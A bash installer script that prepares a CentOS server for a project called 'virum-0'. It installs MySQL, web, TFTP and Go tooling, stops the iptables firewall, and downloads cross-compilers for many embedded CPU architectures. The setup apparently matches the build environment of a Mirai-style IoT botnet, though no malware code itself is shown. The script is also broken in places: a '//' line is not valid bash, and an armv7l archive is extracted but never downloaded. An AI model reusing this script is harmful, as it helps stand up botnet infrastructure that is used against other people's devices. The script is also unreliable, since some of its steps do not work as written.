#!/bin/bash
echo "Starting step 1."
cd ~/
FindDirectory="$(ls | grep virum)"
echo "Directory found $FindDirectory"
if [[ "$FindDirectory" = "virum-0" ]]; then 
echo "Found virum directory in root proceeding"
else 
echo "Directory not placed in root, must be as this /root/virum-0/ or it wont work"
exit
fi
echo "-----------------------------------------------------"
echo "If anything prompts up asking for Y/N please select Y"
echo "-----------------------------------------------------"
sleep 5
//yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
yum install git -y
yum install ipset -y 
yum install iptables -y
yum install iptables-services -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
sudo yum localinstall https://dev.mysql.com/get/mysql80-community-release-el7-1.noarch.rpm
rpm -Va --nofiles --nodigest
sudo yum install mysql-community-server -y
systemctl start mysqld
systemctl status mysqld

service iptables stop 
service httpd restart
service mysqld restart

mkdir /etc/xcompile
cd /etc/xcompile 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2

wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-x86_64.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i686 i686
mv cross-compiler-x86_64 x86_64
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
chmod 777 iptables.sh
chmod 777 IpSet.sh

cd /tmp
wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
tar -xvf go1.9.4.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env


git clone https://github.com/udhos/update-golang
cd update-golang
sudo ./update-golang.sh


cd ~/
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords
clear 
echo "Done building step 1"
echo "Proceeding with auto filling up files. "
cd /root/virum-0/
sh after.sh
